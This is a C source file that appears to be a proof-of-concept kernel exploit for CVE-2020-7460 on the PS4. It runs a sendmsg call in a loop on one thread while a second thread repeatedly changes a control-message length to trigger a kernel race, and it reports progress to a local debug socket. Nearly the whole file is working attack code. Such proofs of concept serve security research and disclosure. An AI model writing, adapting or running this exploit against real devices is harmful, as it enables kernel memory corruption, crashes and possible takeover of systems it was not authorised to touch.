#include "ps4.h"
#include "Network.h"

struct msghdr {
    void         *msg_name;
    uint32_t      msg_namelen;
    void         *msg_iov;
    int           msg_iovlen;
    void         *msg_control;
    uint32_t      msg_controllen;
    int           msg_flags;
};

struct cmsghdr {
    uint32_t      cmsg_len;
    int           cmsg_level;
    int           cmsg_type;
};

#define IP_RETOPTS 7
#define ITERATIONS 500000
#define CONTROL_LEN 256
#define DEBUG_IP "192.168.100.16"
#define DEBUG_PORT 9023

struct cmsghdr *cmsg;
uint8_t control_buf[CONTROL_LEN];
int global_sock;
int debug_sock;

void *sendmsg_thread(void *arg) {
    SceKernelCpuset cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    scePthreadSetaffinityNp(scePthreadSelf(), &cpuset);

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;

    for (int i = 0; i < ITERATIONS; i++) {
        syscall(28, global_sock, &msg, 0);
    }
    return NULL;
}

void *race_thread(void *arg) {
    SceKernelCpuset cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    scePthreadSetaffinityNp(scePthreadSelf(), &cpuset);

    if (!cmsg) return NULL;

    for (int i = 0; i < ITERATIONS; i++) {
        cmsg->cmsg_len = 0x50;
        cmsg->cmsg_len = 0xFFFF;
    }
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);
    initKernel();
    initLibc();
    initNetwork();

    debug_sock = SckConnect(DEBUG_IP, DEBUG_PORT);
    
    if (debug_sock > 0) {
        char msg[] = "[+] Connected! Starting CVE-2020-7460 PoC\n";
        SckSend(debug_sock, msg, strlen(msg));
    }

    global_sock = syscall(97, 2, 2, 0);
    if (global_sock < 0) {
        if (debug_sock > 0) {
            char err[] = "[-] Failed to create socket\n";
            SckSend(debug_sock, err, strlen(err));
        }
        return -1;
    }

    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0;
    cmsg->cmsg_type = IP_RETOPTS;
    cmsg->cmsg_len = 0x50;

    ScePthread thread1, thread2;
    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&thread2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(thread1, NULL);
    scePthreadJoin(thread2, NULL);

    if (debug_sock > 0) {
        char done[] = "[+] Race finished. Check for Panic.\n";
        SckSend(debug_sock, done, strlen(done));
        SckClose(debug_sock);
    }

    return 0;
}
